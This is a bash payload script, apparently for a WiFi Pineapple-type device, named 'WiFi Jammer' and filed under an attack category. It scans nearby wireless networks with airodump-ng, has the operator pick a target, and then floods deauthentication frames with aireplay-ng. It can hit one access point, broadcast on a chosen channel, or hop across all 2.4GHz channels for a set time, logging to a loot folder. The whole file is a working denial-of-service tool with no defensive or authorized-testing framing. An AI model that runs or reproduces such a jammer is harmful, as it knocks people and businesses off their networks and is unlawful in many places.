#!/bin/bash
# Title: WiFi Jammer
# Author: bad-antics
# Description: Continuous WiFi disruption via deauth
# Category: nullsec/attack

LOOT_DIR="/mmc/nullsec/jammer"
mkdir -p "$LOOT_DIR"

PROMPT "WIFI JAMMER

Continuous deauthentication
to disrupt WiFi service.

Modes:
1. Specific network
2. All on channel
3. Channel-hop all 2.4GHz

Press OK to configure."

MON_IF=""
for iface in wlan1mon wlan2mon wlan0mon; do
    [ -d "/sys/class/net/$iface" ] && MON_IF="$iface" && break
done
[ -z "$MON_IF" ] && { ERROR_DIALOG "No monitor interface!"; exit 1; }

PROMPT "JAMMING MODE:

1. Jam specific network
2. Jam one channel
3. Hop all 2.4GHz channels

Select mode next."

MODE=$(NUMBER_PICKER "Mode (1-3):" 3)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) MODE=3 ;; esac

TARGET_BSSID="FF:FF:FF:FF:FF:FF"
TARGET_CH="1"

if [ "$MODE" -eq 1 ]; then
    SPINNER_START "Scanning targets..."
    rm -f /tmp/jamtarget*
    timeout 10 airodump-ng "$MON_IF" -w /tmp/jamtarget --output-format csv 2>/dev/null &
    sleep 10
    killall airodump-ng 2>/dev/null
    SPINNER_STOP

    NET_COUNT=0
    NETS=""
    if [ -f /tmp/jamtarget-01.csv ]; then
        while IFS=',' read -r bssid x1 x2 channel x3 x4 x5 x6 power x7 x8 x9 x10 essid rest; do
            bssid=$(echo "$bssid" | tr -d ' ')
            [[ ! "$bssid" =~ ^[0-9A-Fa-f]{2}: ]] && continue
            essid=$(echo "$essid" | sed 's/^[[:space:]]*//' | head -c 18)
            [ -z "$essid" ] && essid="[Hidden]"
            NET_COUNT=$((NET_COUNT + 1))
            NETS="${NETS}${NET_COUNT}. ${essid}\n"
            eval "BSSID_${NET_COUNT}=\"$bssid\""
            eval "CH_${NET_COUNT}=$(echo $channel | tr -d ' ')"
            [ $NET_COUNT -ge 10 ] && break
        done < /tmp/jamtarget-01.csv
    fi

    [ $NET_COUNT -gt 0 ] && {
        PROMPT "TARGETS: $NET_COUNT\n\n$(echo -e "$NETS")"
        SEL=$(NUMBER_PICKER "Target (1-$NET_COUNT):" 1)
        eval "TARGET_BSSID=\"\$BSSID_${SEL}\""
        eval "TARGET_CH=\"\$CH_${SEL}\""
    }
    rm -f /tmp/jamtarget*
elif [ "$MODE" -eq 2 ]; then
    TARGET_CH=$(NUMBER_PICKER "Channel (1-11):" 6)
fi

DURATION=$(NUMBER_PICKER "Duration (seconds):" 60)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=60 ;; esac

resp=$(CONFIRMATION_DIALOG "START JAMMING?

Mode: $MODE
Duration: ${DURATION}s

Press OK to jam.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

LOG "Jamming started..."
LOG_FILE="$LOOT_DIR/jam_$(date +%Y%m%d_%H%M).log"

case $MODE in
    1)
        iwconfig "$MON_IF" channel "$TARGET_CH" 2>/dev/null
        timeout "$DURATION" aireplay-ng -0 0 -a "$TARGET_BSSID" "$MON_IF" 2>&1 | tee "$LOG_FILE" &
        wait $!
        ;;
    2)
        iwconfig "$MON_IF" channel "$TARGET_CH" 2>/dev/null
        timeout "$DURATION" aireplay-ng -0 0 -a FF:FF:FF:FF:FF:FF "$MON_IF" 2>&1 | tee "$LOG_FILE" &
        wait $!
        ;;
    3)
        END_TIME=$(($(date +%s) + DURATION))
        while [ $(date +%s) -lt $END_TIME ]; do
            for CH in 1 2 3 4 5 6 7 8 9 10 11; do
                [ $(date +%s) -ge $END_TIME ] && break
                iwconfig "$MON_IF" channel $CH 2>/dev/null
                aireplay-ng -0 10 -a FF:FF:FF:FF:FF:FF "$MON_IF" 2>/dev/null &
                echo "$(date +%H:%M:%S) CH:$CH" >> "$LOG_FILE"
                sleep 2
                killall aireplay-ng 2>/dev/null
            done
        done
        ;;
esac

killall aireplay-ng 2>/dev/null

PROMPT "JAMMING COMPLETE

Duration: ${DURATION}s
Log: $LOG_FILE

Press OK to exit."
